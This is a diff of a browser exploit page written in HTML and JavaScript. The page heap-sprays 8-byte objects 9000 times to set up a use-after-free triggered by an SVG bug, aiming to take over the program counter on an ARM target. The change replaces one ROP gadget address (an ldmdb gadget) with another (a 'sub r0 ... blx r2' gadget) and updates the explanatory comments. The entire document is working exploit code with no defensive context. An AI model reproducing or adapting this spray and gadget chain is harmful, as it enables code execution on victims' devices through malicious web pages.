@@ -1,4 +1,4 @@
-<!DOCTYPE html> <!-- This page is spraying 8 byte objects that will eventually override PC when the svg glitch on the next page triggers. 9000 writes of this object seems to help trigger the garbage collection that facilitates the UAF. The gadgets sprayed are an ldmdb r0 that overwrites more registers by virtue of us eventually controlling data behind r0-->
+<!DOCTYPE html> <!-- This page is spraying 8 byte objects that will eventually override PC when the svg glitch on the next page triggers. 9000 writes of this object seems to help trigger the garbage collection that facilitates the UAF. The gadgets sprayed are an "sub r0, r0, #0x2c ; ldr r0, [r0] ... blx r2" redirect r0's address and eventually using this to control data in the previous bmp image -->
 <script>
 
 	//var obj= new ArrayBuffer(size); 
@@ -16,7 +16,7 @@ function spray4(iter) {
 	var x=0;
 	for(var i=0; i < iter; i++){
 		x = (i*2) % 366;
-		ob(0x8, 0x00202f74); //this is our ldmdb gadget repeated twice for our 8 byte PC takeover object.
+		ob(0x8, 0x00e14e60); //this is our initial "sub r0, r0, #0x2c ; ldr r0, [r0] ... blx r2" gadget repeated twice for our 8 byte PC takeover object.
 	}
 }
 spray4(9000);	
